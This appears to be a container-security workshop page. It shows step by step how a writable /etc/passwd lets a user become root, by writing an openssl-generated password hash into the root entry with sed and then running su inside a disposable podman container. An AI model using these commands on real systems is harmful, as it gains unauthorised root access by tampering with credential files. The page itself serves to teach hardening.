The reason that it is possible for a user to become `root` when `/etc/passwd` is writable, is that although passwords are now stored in `/etc/shadow`, they were once upon a time stored in `/etc/passwd`. That functionality hasn't actually been disabled in Linux. You can manually add a password hash to `/etc/passwd` and it will still be used for authenticating a user.

To show the consequences of this, start a container with an interactive shell:

```execute
podman run -it --rm greeting bash
```

In the container, make a copy of the `/etc/passwd` file.

```execute
cp /etc/passwd /tmp/passwd
```

Generate a hashed password value, where the value of the password is `secret`.

```execute
HASHED_PASSWORD=`openssl passwd -1 secret`
```

Update the `/etc/passwd` file to set this hashed password as that for the `root` user.

```execute
cat /tmp/passwd | sed "s%root:x%root:${HASHED_PASSWORD}%" > /etc/passwd
```

Having updated the `/etc/passwd` file now execute `su` to be come `root`.

```execute
su root
```

You will be prompted for a password, enter:

```execute
secret
```

Verify what user you are by running:

```execute
id
```

The output should be:

```
uid=0(root) gid=0(root) groups=0(root)
```

indicating you are the `root` user.
